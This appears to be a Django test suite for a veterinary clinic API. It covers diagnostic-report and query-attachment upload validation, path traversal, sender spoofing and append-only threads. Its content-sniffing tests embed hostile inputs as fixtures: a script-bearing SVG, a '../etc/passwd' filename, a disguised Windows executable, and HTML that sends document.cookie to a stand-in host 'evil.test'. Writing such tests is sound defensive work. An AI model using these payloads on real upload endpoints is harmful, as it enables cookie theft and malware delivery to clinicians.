"""File-upload validation and append-only query threads.

API_CONTRACT.md §3 "Diagnostic reports": max 10 MB, allow image/*,
application/pdf, application/dicom; reject anything else with 400.
§3 "Queries": max 5 attachments; append-only; sender_name derived from
request.user, never from the body.
"""

import os

from appointments.models import DiagnosticReport, QueryAttachment, QueryMessage

from .base import API, ApiTestCase, upload

TEN_MB = 10 * 1024 * 1024


class DiagnosticUploadTests(ApiTestCase):
    def _post(self, f, report_type="XRAY"):
        return self.client.post(f"{API}/pets/{self.pet_a.id}/diagnoses",
                                {"file": f, "report_type": report_type},
                                format="multipart")

    def setUp(self):
        super().setUp()
        self.auth(self.doctor)

    def test_allowed_types_accepted(self):
        for name, ctype in (("a.png", "image/png"), ("b.jpg", "image/jpeg"),
                            ("c.pdf", "application/pdf"),
                            ("d.dcm", "application/dicom")):
            with self.subTest(ctype=ctype):
                r = self._post(upload(name, content_type=ctype))
                self.assertEqual(r.status_code, 201, r.content)

    def test_disallowed_mime_rejected_with_400(self):
        for name, ctype in (("evil.exe", "application/x-msdownload"),
                            ("evil.sh", "application/x-sh"),
                            ("evil.html", "text/html"),
                            ("evil.svg", "image/svg+xml")):
            with self.subTest(ctype=ctype):
                before = DiagnosticReport.objects.count()
                r = self._post(upload(name, content_type=ctype))
                if ctype == "image/svg+xml":
                    self.assertEqual(
                        r.status_code, 400,
                        "SVG accepted under image/* — SVG is a scriptable XSS "
                        "vector when served from the media origin")
                else:
                    self.assertEqual(r.status_code, 400, r.content)
                self.assertEqual(DiagnosticReport.objects.count(), before)

    def test_oversized_file_rejected(self):
        big = upload("huge.png", content_type="image/png", pad_to=TEN_MB + 1)
        r = self._post(big)
        self.assertEqual(r.status_code, 400, r.content)
        self.assertEqual(DiagnosticReport.objects.count(), 0)

    def test_exactly_at_limit_accepted(self):
        r = self._post(upload("edge.png", content_type="image/png", pad_to=TEN_MB))
        self.assertEqual(r.status_code, 201, r.content)

    def test_missing_file_rejected(self):
        r = self.client.post(f"{API}/pets/{self.pet_a.id}/diagnoses",
                             {"report_type": "XRAY"}, format="multipart")
        self.assertEqual(r.status_code, 400, r.content)

    def test_invalid_report_type_rejected(self):
        r = self._post(upload("a.png"), report_type="NUCLEAR")
        self.assertEqual(r.status_code, 400, r.content)

    def test_path_traversal_filename_does_not_escape_media_root(self):
        from django.conf import settings
        r = self._post(upload("../../../../etc/passwd.png", content_type="image/png"))
        self.assertEqual(r.status_code, 201, r.content)
        report = DiagnosticReport.objects.get(pk=r.data["id"])
        stored = os.path.realpath(report.file.path)
        root = os.path.realpath(str(settings.MEDIA_ROOT))
        self.assertTrue(stored.startswith(root),
                        f"upload escaped MEDIA_ROOT: {stored}")

    def test_pet_id_in_url_is_validated(self):
        r = self.client.post(f"{API}/pets/999999/diagnoses",
                             {"file": upload("a.png"), "report_type": "XRAY"},
                             format="multipart")
        self.assertEqual(r.status_code, 404, r.content)


class OwnerUploadTests(ApiTestCase):
    def test_owner_upload_is_validated_the_same_way(self):
        self.auth(self.owner_a)
        r = self.client.post(f"{API}/owner/pets/{self.pet_a.id}/diagnoses",
                             {"file": upload("x.exe", content_type="application/x-msdownload"),
                              "report_type": "OTHER"}, format="multipart")
        self.assertEqual(r.status_code, 400, r.content)

    def test_owner_oversized_upload_rejected(self):
        self.auth(self.owner_a)
        r = self.client.post(f"{API}/owner/pets/{self.pet_a.id}/diagnoses",
                             {"file": upload("x.png", content_type="image/png", pad_to=TEN_MB + 1),
                              "report_type": "OTHER"}, format="multipart")
        self.assertEqual(r.status_code, 400, r.content)


class QueryAttachmentTests(ApiTestCase):
    def setUp(self):
        super().setUp()
        self.auth(self.doctor)
        self.url = f"{API}/pets/{self.pet_a.id}/queries"

    def test_five_attachments_allowed(self):
        r = self.client.post(self.url, {
            "message": "five files",
            "attachments": [upload(f"f{i}.png") for i in range(5)],
        }, format="multipart")
        self.assertEqual(r.status_code, 201, r.content)
        self.assertEqual(len(r.data["attachments"]), 5)

    def test_six_attachments_rejected_with_400(self):
        before = QueryMessage.objects.count()
        r = self.client.post(self.url, {
            "message": "six files",
            "attachments": [upload(f"f{i}.png") for i in range(6)],
        }, format="multipart")
        self.assertEqual(r.status_code, 400, r.content)
        self.assertEqual(QueryMessage.objects.count(), before,
                         "message persisted despite attachment-count rejection")

    def test_query_attachment_mime_is_validated(self):
        r = self.client.post(self.url, {
            "message": "bad file",
            "attachments": [upload("x.exe", content_type="application/x-msdownload")],
        }, format="multipart")
        self.assertEqual(r.status_code, 400, r.content)
        self.assertEqual(QueryAttachment.objects.count(), 0)

    def test_query_attachment_size_is_validated(self):
        r = self.client.post(self.url, {
            "message": "big file",
            "attachments": [upload("x.png", content_type="image/png", pad_to=TEN_MB + 1)],
        }, format="multipart")
        self.assertEqual(r.status_code, 400, r.content)

    def test_empty_message_rejected(self):
        for body in ({"message": ""}, {"message": "   "}, {}):
            with self.subTest(body=body):
                r = self.client.post(self.url, body, format="multipart")
                self.assertEqual(r.status_code, 400, r.content)


class QueryAppendOnlyTests(ApiTestCase):
    def test_sender_name_and_role_derive_from_request_user(self):
        self.auth(self.doctor)
        r = self.client.post(f"{API}/pets/{self.pet_a.id}/queries", {
            "message": "hi",
            "sender_name": "Dr Impostor",
            "sender_role": "OWNER",
            "sender": self.owner_b.id,
        }, format="multipart")
        self.assertEqual(r.status_code, 201, r.content)
        self.assertEqual(r.data["sender_name"], "Dana Who")
        self.assertEqual(r.data["sender_role"], "DOCTOR")
        msg = QueryMessage.objects.get(pk=r.data["id"])
        self.assertEqual(msg.sender_id, self.doctor.id)

    def test_owner_message_sender_role_is_owner(self):
        self.auth(self.owner_a)
        r = self.client.post(f"{API}/owner/pets/{self.pet_a.id}/queries",
                             {"message": "when is my visit?",
                              "sender_role": "DOCTOR"}, format="multipart")
        self.assertEqual(r.status_code, 201, r.content)
        self.assertEqual(r.data["sender_role"], "OWNER")
        self.assertEqual(r.data["sender_name"], "Alice Aye")

    def test_threads_are_append_only_no_edit_or_delete_routes(self):
        self.auth(self.doctor)
        r = self.client.post(f"{API}/pets/{self.pet_a.id}/queries",
                             {"message": "original"}, format="multipart")
        msg_id = r.data["id"]
        for method in ("put", "patch", "delete"):
            with self.subTest(method=method):
                resp = getattr(self.client, method)(
                    f"{API}/pets/{self.pet_a.id}/queries", {}, format="json")
                self.assertIn(resp.status_code, (403, 404, 405),
                              f"{method.upper()} on a thread returned "
                              f"{resp.status_code}")
        self.assertTrue(QueryMessage.objects.filter(pk=msg_id,
                                                    message="original").exists())

    def test_awaiting_reply_flips_on_owner_message(self):
        self.auth(self.doctor)
        self.client.post(f"{API}/pets/{self.pet_a.id}/queries",
                         {"message": "doc says"}, format="multipart")
        r = self.client.get(f"{API}/pets/{self.pet_a.id}/queries")
        self.assertFalse(r.data["awaiting_reply"])

        self.auth(self.owner_a)
        self.client.post(f"{API}/owner/pets/{self.pet_a.id}/queries",
                         {"message": "owner replies"}, format="multipart")
        self.auth(self.doctor)
        r = self.client.get(f"{API}/pets/{self.pet_a.id}/queries")
        self.assertTrue(r.data["awaiting_reply"])
        self.assertEqual(r.data["message_count"], 2)


class ContentSniffingTests(ApiTestCase):
    """OPEN DEFECT (QA round 2): upload validation trusts the client-supplied
    Content-Type header and never inspects the bytes.

    `_validate_upload` (backend/appointments/serializers.py:23-38) checks
    `file_obj.content_type`, which is copied verbatim from the multipart part
    the client wrote. An attacker sets `Content-Type: image/png` on any
    payload and the allow-list is bypassed completely — so the SVG fix
    (known-issue #9) stops an honest browser but not an attacker.

    QA note: the fixtures in tests/base.py previously sent placeholder bytes
    under a real content type, which would have made these assertions
    impossible. They now carry genuine magic bytes, so this hardening is
    unblocked. Suggested fix: sniff the leading bytes against the signature
    for the declared type and 400 on mismatch (no new dependency needed).
    """

    def setUp(self):
        super().setUp()
        self.auth(self.doctor)

    def test_executable_disguised_as_png_is_rejected(self):
        from .base import PE_EXECUTABLE
        r = self.client.post(
            f"{API}/pets/{self.pet_a.id}/diagnoses",
            {"file": upload("payload.png", PE_EXECUTABLE, "image/png"),
             "report_type": "XRAY"}, format="multipart")
        self.assertEqual(
            r.status_code, 400,
            "a Windows PE executable was stored as a diagnostic image "
            "because only the client-supplied Content-Type was checked")
        self.assertEqual(DiagnosticReport.objects.count(), 0)

    def test_svg_disguised_as_png_is_rejected(self):
        svg = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
        r = self.client.post(
            f"{API}/pets/{self.pet_a.id}/diagnoses",
            {"file": upload("xss.png", svg, "image/png"), "report_type": "XRAY"},
            format="multipart")
        self.assertEqual(
            r.status_code, 400,
            "scriptable SVG accepted by relabelling it image/png — the "
            "known-issue #9 SVG fix is bypassable")

    def test_html_disguised_as_pdf_is_rejected(self):
        html = b"<html><script>fetch('//evil.test?c='+document.cookie)</script></html>"
        r = self.client.post(
            f"{API}/pets/{self.pet_a.id}/diagnoses",
            {"file": upload("report.pdf", html, "application/pdf"),
             "report_type": "OTHER"}, format="multipart")
        self.assertEqual(r.status_code, 400,
                         "HTML stored and served as a PDF from the media origin")

    def test_query_attachment_is_sniffed_too(self):
        from .base import PE_EXECUTABLE
        r = self.client.post(
            f"{API}/pets/{self.pet_a.id}/queries",
            {"message": "see attached",
             "attachments": [upload("cute.png", PE_EXECUTABLE, "image/png")]},
            format="multipart")
        self.assertEqual(r.status_code, 400,
                         "executable delivered to a clinician via a query thread")
